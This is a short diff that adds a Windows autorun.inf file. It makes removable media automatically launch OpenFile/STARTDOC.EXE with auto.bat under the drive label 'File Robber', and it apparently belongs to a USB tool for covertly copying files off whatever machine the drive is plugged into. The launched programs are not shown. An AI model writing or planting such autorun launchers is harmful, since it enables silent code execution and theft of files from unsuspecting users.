@@ -1,0 +1,3 @@
+[AutoRun]
+OPEN=OpenFile/STARTDOC.EXE auto.bat
+LABEL=File Robber
